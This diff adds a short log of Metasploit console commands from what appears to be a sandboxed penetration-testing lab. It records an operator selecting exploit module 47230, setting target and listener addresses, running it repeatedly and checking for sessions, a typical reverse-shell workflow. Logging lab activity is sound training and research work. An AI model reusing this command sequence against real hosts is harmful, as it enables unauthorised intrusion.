@@ -1,0 +1,14 @@
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:01:45.101Z", "cmd_type": "msf-command", "cmd": "sessions -i 1"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:01:51.588Z", "cmd_type": "msf-command", "cmd": "sessions"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:02:25.429Z", "cmd_type": "msf-command", "cmd": "sessions"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:02:31.821Z", "cmd_type": "msf-command", "cmd": "use exploit/47230"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:02:36.298Z", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:02:45.388Z", "cmd_type": "msf-command", "cmd": "set rhosts 172.18.1.5"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:02:51.299Z", "cmd_type": "msf-command", "cmd": "set lhost 10.1.135.83"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:02:58.732Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:03:17.128Z", "cmd_type": "msf-command", "cmd": "sessions"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:03:21.670Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:03:30.858Z", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:03:58.386Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:04:16.409Z", "cmd_type": "msf-command", "cmd": "set LPORT 4445"}
+{"sandbox_id": "28", "timestamp_str": "2021-04-22T15:04:20.393Z", "cmd_type": "msf-command", "cmd": "show options"}
